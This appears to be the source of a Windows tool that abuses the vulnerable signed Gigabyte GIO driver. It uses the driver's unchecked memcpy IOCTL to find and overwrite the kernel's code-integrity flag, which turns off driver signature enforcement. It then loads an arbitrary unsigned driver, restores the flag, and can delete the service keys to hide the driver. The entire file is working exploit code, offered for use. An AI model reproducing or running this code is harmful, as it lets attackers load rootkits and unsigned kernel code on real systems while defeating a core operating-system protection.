#include "global.h"
#include "hde/hde64.h"
#include <shlwapi.h>
#include <devioctl.h>

#define EQUALS(a, b)				(RtlCompareMemory(a, b, sizeof(b) - 1) == (sizeof(b) - 1))
#define NT_MACHINE					L"\\Registry\\Machine\\"
#define SVC_BASE					NT_MACHINE L"System\\CurrentControlSet\\Services\\"

// Gigabyte GIO device name and type, and IOCTL code for memcpy call
#define GIO_DEVICE_NAME				L"\\Device\\GIO"
#define FILE_DEVICE_GIO				(0xc350)
#define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GIO_GETPHYS			CTL_CODE(FILE_DEVICE_GIO, 0xa03, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GIO_MAPPHYS			CTL_CODE(FILE_DEVICE_GIO, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Input struct for IOCTL_GIO_MEMCPY
typedef struct _GIOMemcpyInput
{
	ULONG_PTR Dst;
	ULONG_PTR Src;
	ULONG Size;
} GIOMemcpyInput, *PGIOMemcpyInput;

// Input struct for IOCTL_GIO_MAPPHYS
#pragma pack (push, 1)
typedef struct _GIO_MAPPHYS
{
	DWORD InterfaceType;
	DWORD Bus;
	PVOID PhysicalAddress;
	DWORD IoSpace;
	DWORD Size;
} GIO_MAPPHYS, *PGIO_MAPPHYS;
#pragma pack (pop)

static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];

static
NTSTATUS
FindKernelModule(
	_In_ PCCH ModuleName,
	_Out_ PULONG_PTR ModuleBase
	)
{
	*ModuleBase = 0;

	ULONG Size = 0;
	NTSTATUS Status;
	if ((Status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &Size)) != STATUS_INFO_LENGTH_MISMATCH)
		return Status;
	
	const PRTL_PROCESS_MODULES Modules = static_cast<PRTL_PROCESS_MODULES>(RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, 2 * static_cast<SIZE_T>(Size)));
	Status = NtQuerySystemInformation(SystemModuleInformation,
										Modules,
										2 * Size,
										nullptr);
	if (!NT_SUCCESS(Status))
		goto Exit;

	for (ULONG i = 0; i < Modules->NumberOfModules; ++i)
	{
		RTL_PROCESS_MODULE_INFORMATION Module = Modules->Modules[i];
		if (_stricmp(ModuleName, reinterpret_cast<PCHAR>(Module.FullPathName) + Module.OffsetToFileName) == 0)
		{
			*ModuleBase = reinterpret_cast<ULONG_PTR>(Module.ImageBase);
			Status = STATUS_SUCCESS;
			break;
		}
	}

Exit:
	RtlFreeHeap(RtlProcessHeap(), 0, Modules);
	return Status;
}

// For Windows Vista/7
static
LONG
QueryCiEnabled(
	_In_ PVOID MappedBase,
	_In_ SIZE_T SizeOfImage,
	_In_ ULONG_PTR KernelBase,
	_Out_ PULONG_PTR gCiEnabledAddress
	)
{
	*gCiEnabledAddress = 0;

	LONG Rel = 0;
	for (SIZE_T c = 0; c < SizeOfImage - sizeof(ULONG); c++)
	{
		if (*reinterpret_cast<PULONG>(static_cast<PUCHAR>(MappedBase) + c) == 0x1d8806eb)
		{
			Rel = *reinterpret_cast<PLONG>(static_cast<PUCHAR>(MappedBase) + c + 4);
			*gCiEnabledAddress = KernelBase + c + 8 + Rel;
			break;
		}
	}
	return Rel;
}

// For Windows 8 and worse
static
LONG
QueryCiOptions(
	_In_ PVOID MappedBase,
	_In_ ULONG_PTR KernelBase,
	_Out_ PULONG_PTR gCiOptionsAddress
	)
{
	*gCiOptionsAddress = 0;

	ULONG c;
	LONG Rel = 0;
	hde64s hs;

	const PUCHAR CiInitialize = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "CiInitialize"));
	if (CiInitialize == nullptr)
		return 0;

	if (NtCurrentPeb()->OSBuildNumber >= 16299)
	{
		c = 0;
		ULONG j = 0;
		do
		{
			// call CipInitialize
			if (CiInitialize[c] == 0xE8)
				j++;

			if (j > 1)
			{
				Rel = *reinterpret_cast<PLONG>(CiInitialize + c + 1);
				break;
			}

			hde64_disasm(CiInitialize + c, &hs);
			if (hs.flags & F_ERROR)
				break;
			c += hs.len;

		} while (c < 256);
	}
	else
	{
		c = 0;
		do
		{
			// jmp CipInitialize
			if (CiInitialize[c] == 0xE9)
			{
				Rel = *reinterpret_cast<PLONG>(CiInitialize + c + 1);
				break;
			}
			hde64_disasm(CiInitialize + c, &hs);
			if (hs.flags & F_ERROR)
				break;
			c += hs.len;

		} while (c < 256);
	}

	const PUCHAR CipInitialize = CiInitialize + c + 5 + Rel;
	c = 0;
	do
	{
		if (*reinterpret_cast<PUSHORT>(CipInitialize + c) == 0x0d89)
		{
			Rel = *reinterpret_cast<PLONG>(CipInitialize + c + 2);
			break;
		}
		hde64_disasm(CipInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);

	const PUCHAR MappedCiOptions = CipInitialize + c + 6 + Rel;

	*gCiOptionsAddress = KernelBase + MappedCiOptions - static_cast<PUCHAR>(MappedBase);

	return Rel;
}

static
NTSTATUS
AnalyzeCi(
	_Out_ PVOID *CiOptionsAddress
	)
{
	*CiOptionsAddress = nullptr;

	// Map file as SEC_IMAGE
	WCHAR Path[MAX_PATH];
	const CHAR NtoskrnlExe[] = "ntoskrnl.exe";
	const CHAR CiDll[] = "CI.dll";

	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs",
		SharedUserData->NtSystemRoot,
		NtCurrentPeb()->OSBuildNumber >= 9200 ? CiDll : NtoskrnlExe);

	PVOID MappedBase;
	SIZE_T ViewSize;
	NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to map %ls: %08X\n", Path, Status);
		return Status;
	}

	if (NtCurrentPeb()->OSBuildNumber >= 9200)
	{
		// Find CI.dll!g_CiOptions
		ULONG_PTR CiDllBase;
		Status = FindKernelModule(CiDll, &CiDllBase);
		if (!NT_SUCCESS(Status))
			goto Exit;

		ULONG_PTR gCiOptionsAddress;
		const LONG Rel = QueryCiOptions(MappedBase, CiDllBase, &gCiOptionsAddress);
		if (Rel != 0)
		{
			*CiOptionsAddress = reinterpret_cast<PVOID>(gCiOptionsAddress);
			Status = STATUS_SUCCESS;
		}
		else
		{
			Status = STATUS_NOT_FOUND;
		}
	}
	else
	{
		// Find ntoskrnl.exe!g_CiEnabled
		ULONG_PTR KernelBase;
		Status = FindKernelModule(NtoskrnlExe, &KernelBase);
		if (!NT_SUCCESS(Status))
			goto Exit;

		ULONG_PTR gCiEnabledAddress;
		const LONG Rel = QueryCiEnabled(MappedBase, ViewSize, KernelBase, &gCiEnabledAddress);
		if (Rel != 0)
		{
			*CiOptionsAddress = reinterpret_cast<PVOID>(gCiEnabledAddress);
			Status = STATUS_SUCCESS;
		}
		else
		{
			Status = STATUS_NOT_FOUND;
		}
	}
	
Exit:
	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
	return Status;
}

static
PVOID
GetPhysForVirtual(_In_ HANDLE DeviceHandle, _In_ PVOID VirtualAddress)
{
	NTSTATUS Status;
	IO_STATUS_BLOCK IoStatusBlock;

	PVOID Address = VirtualAddress;

	Status = NtDeviceIoControlFile(DeviceHandle,
		nullptr,
		nullptr,
		nullptr,
		&IoStatusBlock,
		IOCTL_GIO_GETPHYS,
		&Address,
		sizeof(Address),
		&Address,
		sizeof(Address));
	if (!NT_SUCCESS(Status))
	{
		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_GETPHYS) failed: error %08X\n", Status);
		return NULL;
	}

	return (PVOID)((reinterpret_cast<LARGE_INTEGER*>(&Address))->LowPart);
}

static
PVOID
MapPhysicalForVirtual(_In_ HANDLE DeviceHandle, _In_ PVOID PhysicalAddress, _In_ DWORD Size)
{
	NTSTATUS Status;
	IO_STATUS_BLOCK IoStatusBlock;

	GIO_MAPPHYS in = { 0 };
	RtlZeroMemory(&in, sizeof(in));
	in.InterfaceType = 0;
	in.Bus = 0;
	in.PhysicalAddress = PhysicalAddress;
	in.IoSpace = 0;
	in.Size = Size;

	Status = NtDeviceIoControlFile(DeviceHandle,
		nullptr,
		nullptr,
		nullptr,
		&IoStatusBlock,
		IOCTL_GIO_MAPPHYS,
		&in,
		sizeof(in),
		&in,
		sizeof(in));
	if (!NT_SUCCESS(Status))
	{
		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MAPPHYS) failed: error %08X\n", Status);
		return NULL;
	}

	return *reinterpret_cast<PVOID*>(&in);
}

static
NTSTATUS
MitigateCiProtectedContent(_In_ HANDLE DeviceHandle, _In_ PVOID* Address)
{
	PVOID PhysicalAddress = GetPhysForVirtual(DeviceHandle, *Address);
	if (!PhysicalAddress)
		return STATUS_INVALID_ADDRESS;

	PVOID MappedVirtualAddress = MapPhysicalForVirtual(DeviceHandle, PhysicalAddress, sizeof(DWORD));
	if (!MappedVirtualAddress)
		return STATUS_INSUFFICIENT_RESOURCES;

	*Address = MappedVirtualAddress;

	return STATUS_SUCCESS;
}

static int ConvertToNtPath(PWCHAR Dst, PWCHAR Src) // TODO: holy shit this is fucking horrible
{
	wcscpy_s(Dst, sizeof(L"\\??\\") / sizeof(WCHAR), L"\\??\\");
	wcscat_s(Dst, (MAX_PATH + sizeof(L"\\??\\")) / sizeof(WCHAR), Src);
	return static_cast<int>(wcslen(Dst)) * sizeof(wchar_t) + sizeof(wchar_t);
}

static void FileNameToServiceName(PWCHAR ServiceName, PWCHAR FileName)
{
	int p = sizeof(SVC_BASE) / sizeof(WCHAR) - 1;
	wcscpy_s(ServiceName, sizeof(SVC_BASE) / sizeof(WCHAR), SVC_BASE);
	for (PWCHAR i = FileName; *i; ++i)
	{
		if (*i == L'\\')
			FileName = i + 1;
	}
	while (*FileName != L'\0' && *FileName != L'.')
		ServiceName[p++] = *FileName++;
	ServiceName[p] = L'\0';
}

static NTSTATUS CreateDriverService(PWCHAR ServiceName, PWCHAR FileName)
{
	FileNameToServiceName(ServiceName, FileName);
	NTSTATUS Status = RtlCreateRegistryKey(RTL_REGISTRY_ABSOLUTE, ServiceName);
	if (!NT_SUCCESS(Status))
		return Status;

	WCHAR NtPath[MAX_PATH];
	ULONG ServiceType = SERVICE_KERNEL_DRIVER;

	Status = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE,
									ServiceName,
									L"ImagePath",
									REG_SZ,
									NtPath,
									ConvertToNtPath(NtPath, FileName));
	if (!NT_SUCCESS(Status))
		return Status;

	Status = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE,
									ServiceName,
									L"Type",
									REG_DWORD,
									&ServiceType,
									sizeof(ServiceType));
	return Status;
}

static void DeleteService(PWCHAR ServiceName)
{
	// TODO: shlwapi.dll? holy fuck this is horrible
	SHDeleteKeyW(HKEY_LOCAL_MACHINE, ServiceName + sizeof(NT_MACHINE) / sizeof(WCHAR) - 1);
}

static BOOLEAN IsCiEnabled()
{
	SYSTEM_CODEINTEGRITY_INFORMATION CiInfo = { sizeof(SYSTEM_CODEINTEGRITY_INFORMATION) };
	const NTSTATUS Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,
													&CiInfo,
													sizeof(CiInfo),
													nullptr);
	if (!NT_SUCCESS(Status))
		Printf(L"Failed to query code integrity status: %08X\n", Status);

	return (CiInfo.CodeIntegrityOptions &
		(CODEINTEGRITY_OPTION_ENABLED | CODEINTEGRITY_OPTION_TESTSIGN)) == CODEINTEGRITY_OPTION_ENABLED;
}

static NTSTATUS LoadDriver(PWCHAR ServiceName)
{
	UNICODE_STRING ServiceNameUcs;
	RtlInitUnicodeString(&ServiceNameUcs, ServiceName);
	return NtLoadDriver(&ServiceNameUcs);
}

static NTSTATUS UnloadDriver(PWCHAR ServiceName)
{
	UNICODE_STRING ServiceNameUcs;
	RtlInitUnicodeString(&ServiceNameUcs, ServiceName);
	return NtUnloadDriver(&ServiceNameUcs);
}

static
NTSTATUS
OpenDeviceHandle(
	_Out_ PHANDLE DeviceHandle,
	_In_ BOOLEAN PrintErrors
	)
{
	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(GIO_DEVICE_NAME);
	OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&DeviceName, OBJ_CASE_INSENSITIVE);
	IO_STATUS_BLOCK IoStatusBlock;

	const NTSTATUS Status = NtCreateFile(DeviceHandle,
										SYNCHRONIZE, // Yes, these really are the only access rights needed. (actually would be 0, but we want SYNCHRONIZE to wait on NtDeviceIoControlFile)
										&ObjectAttributes,
										&IoStatusBlock,
										nullptr,
										FILE_ATTRIBUTE_NORMAL,
										FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
										FILE_OPEN,
										FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
										nullptr,
										0);

	if (!NT_SUCCESS(Status) && PrintErrors) // The first open is expected to fail; don't spam the user about it
		Printf(L"Failed to obtain handle to device %wZ: NtCreateFile: %08X.\n", &DeviceName, Status);

	return Status;
}

static
NTSTATUS
TriggerExploit(
	_In_ PWSTR LoaderServiceName,
	_In_ PVOID CiVariableAddress,
	_In_ ULONG CiOptionsValue,
	_Out_opt_ PULONG OldCiOptionsValue
	)
{
	if (OldCiOptionsValue != nullptr)
		*OldCiOptionsValue = 0;

	// First try to open the device without loading the driver. This only works if it was already loaded
	HANDLE DeviceHandle;
	NTSTATUS Status = OpenDeviceHandle(&DeviceHandle, FALSE);
	if (!NT_SUCCESS(Status))
	{
		// Load the Gigabyte loader driver
		Status = LoadDriver(LoaderServiceName);
		if (!NT_SUCCESS(Status))
		{
			Printf(L"Failed to load driver service %ls. NtLoadDriver: %08X.\n", LoaderServiceName, Status);
			return Status;
		}

		// The device should exist now. If we still can't open it, bail
		Status = OpenDeviceHandle(&DeviceHandle, TRUE);
		if (!NT_SUCCESS(Status))
			return Status;
	}

	// Number of bytes to read/write: 1 on Windows 7, 4 on lesser OSes
	const ULONG CiPatchSize = NtCurrentPeb()->OSBuildNumber >= 9200 ? sizeof(ULONG) : sizeof(UCHAR);
	const UCHAR CiOptionsValueByte = static_cast<UCHAR>(CiOptionsValue);
	
	GIOMemcpyInput MemcpyInput;
	IO_STATUS_BLOCK IoStatusBlock;

	if (OldCiOptionsValue != nullptr) // Only perform this read if the original value was requested
	{
		// Set up memcpy input for a read operation
		ULONG OldCiOptions = 0;
		MemcpyInput.Dst = reinterpret_cast<ULONG_PTR>(&OldCiOptions);
		MemcpyInput.Src = reinterpret_cast<ULONG_PTR>(CiVariableAddress);
		MemcpyInput.Size = CiPatchSize;

		// IOCTL (1): Read the current value of g_CiEnabled/g_CiOptions so we can restore it later
		Status = NtDeviceIoControlFile(DeviceHandle,
										nullptr,
										nullptr,
										nullptr,
										&IoStatusBlock,
										IOCTL_GIO_MEMCPY,
										&MemcpyInput,
										sizeof(MemcpyInput),
										nullptr,
										0);
		if (!NT_SUCCESS(Status))
		{
			Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MEMCPY) *READ* failed: error %08X\n", Status);
			goto Exit;
		}

		// Use the out parameter to return the previous value of g_CiOptions
		*OldCiOptionsValue = OldCiOptions;
	}

	if (NtCurrentPeb()->OSBuildNumber < 18363)
	{
		Printf(L"[Build:%d] g_CiProtectedContent mitigation enabled\n", NtCurrentPeb()->OSBuildNumber, *OldCiOptionsValue);

		Status = MitigateCiProtectedContent(DeviceHandle, &CiVariableAddress);
		if (!NT_SUCCESS(Status))
		{
			Printf(L"MitigateCiProtectedContent failed: error %08X\n", Status);
			goto Exit;
		}
	}

	// Set up memcpy input a second time, this time for writing
	MemcpyInput.Dst = reinterpret_cast<ULONG_PTR>(CiVariableAddress);
	MemcpyInput.Src = CiPatchSize == sizeof(ULONG)
		? reinterpret_cast<ULONG_PTR>(&CiOptionsValue)
		: reinterpret_cast<ULONG_PTR>(&CiOptionsValueByte);
	MemcpyInput.Size = CiPatchSize;

	// IOCTL (2): Use the driver IOCTL's juicy memcpy that performs zero access checks to write the desired value to the kernel address
	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
	Status = NtDeviceIoControlFile(DeviceHandle,
									nullptr,
									nullptr,
									nullptr,
									&IoStatusBlock,
									IOCTL_GIO_MEMCPY,
									&MemcpyInput,
									sizeof(MemcpyInput),
									nullptr,
									0);
	if (!NT_SUCCESS(Status))
		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MEMCPY) *WRITE* failed: error %08X\n", Status);

Exit:
	NtClose(DeviceHandle);

	return Status;
}

NTSTATUS
WindLoadDriver(
	_In_ PWCHAR LoaderName,
	_In_ PWCHAR DriverName,
	_In_ BOOLEAN Hidden
	)
{
	WCHAR LoaderPath[MAX_PATH], DriverPath[MAX_PATH];

	// Find CI!g_CiOptions/nt!g_CiEnabled
	PVOID CiOptionsAddress;
	NTSTATUS Status = AnalyzeCi(&CiOptionsAddress);
	if (!NT_SUCCESS(Status))
		return Status;

	Printf(L"%ls at 0x%p.\n", (NtCurrentPeb()->OSBuildNumber >= 9200 ? L"CI!g_CiOptions" : L"nt!g_CiEnabled"), CiOptionsAddress);

	// Enable privileges
	CONSTEXPR CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
								TRUE,
								FALSE,
								&SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\n");
		return Status;
	}

	// Expand filenames to full paths
	Status = RtlGetFullPathName_UEx(LoaderName, MAX_PATH * sizeof(WCHAR), LoaderPath, nullptr, nullptr);
	if (!NT_SUCCESS(Status))
		return Status;
	Status = RtlGetFullPathName_UEx(DriverName, MAX_PATH * sizeof(WCHAR), DriverPath, nullptr, nullptr);
	if (!NT_SUCCESS(Status))
		return Status;

	// Create the target driver service
	Status = CreateDriverService(DriverServiceName, DriverPath);
	if (!NT_SUCCESS(Status))
		return Status;

	if (!IsCiEnabled())
	{
		// CI is already disabled, just load the driver
		Printf(L"WARNING: CI is already disabled!\n");
		return LoadDriver(DriverServiceName);
	}

	// Create the loader driver service
	Status = CreateDriverService(LoaderServiceName, LoaderPath);
	if (!NT_SUCCESS(Status))
		return Status;

	// Disable CI
	ULONG OldCiOptionsValue;
	Status = TriggerExploit(LoaderServiceName, CiOptionsAddress, 0, &OldCiOptionsValue);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to disable DSE through Gigabyte loader driver: %08X\n", Status);
		goto Exit;
	}

	Printf(L"Successfully disabled DSE.");
	if (NtCurrentPeb()->OSBuildNumber >= 9200)
	{
		Printf(L" Original g_CiOptions value: 0x%X.", OldCiOptionsValue);
	}
	Printf(L"\n");

	// Load target driver
	Status = LoadDriver(DriverServiceName);
	if (!NT_SUCCESS(Status))
	{
		if (Status == STATUS_IMAGE_ALREADY_LOADED)
		{
			// Already loaded - attempt to reload
			Status = UnloadDriver(DriverServiceName);
			if (!NT_SUCCESS(Status))
				Printf(L"Target driver is already loaded, and unloading failed with status %08X\n", Status);
			else
			{
				Status = LoadDriver(DriverServiceName);
				if (!NT_SUCCESS(Status))
					Printf(L"Failed to reload target driver: %08X\n", Status);
				else
					Printf(L"Succesfully reloaded target driver.\n");
			}
		}
		else
			Printf(L"Failed to load target driver: %08X\n", Status);
	}
	else
	{
		Printf(L"Target driver loaded successfully.\n");
	}

	// Reset original CI status
	Status = TriggerExploit(LoaderServiceName, CiOptionsAddress, OldCiOptionsValue, nullptr);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"WARNING: failed to re-enable DSE through Gigabyte loader driver: %08X\n", Status);
		Status = STATUS_SUCCESS; // Don't DeleteService() the target driver in the error path below; we are past the point of no return
	}
	else
	{
		Printf(L"Successfully re-enabled DSE.\n");
	}

	// Unload the loader driver since we are done with it
	UnloadDriver(LoaderServiceName);
	DeleteService(LoaderServiceName);

Exit:
	if (!NT_SUCCESS(Status) || Hidden)
		DeleteService(DriverServiceName);

	// Revert privileges
	RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
						SeLoadDriverWasEnabled,
						FALSE,
						&SeLoadDriverWasEnabled);

	return Status;
}

NTSTATUS
WindUnloadDriver(
	_In_ PWCHAR DriverName,
	_In_ BOOLEAN Hidden
	)
{
	CONSTEXPR CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
										TRUE,
										FALSE,
										&SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status))
		return Status;

	if (DriverName != nullptr && Hidden)
		CreateDriverService(DriverServiceName, DriverName);

	FileNameToServiceName(DriverServiceName, DriverName);

	Status = UnloadDriver(DriverServiceName);
	if (NT_SUCCESS(Status) || Hidden)
		DeleteService(DriverServiceName);

	RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE,
						SeLoadDriverWasEnabled,
						FALSE,
						&SeLoadDriverWasEnabled);

	return Status;
}
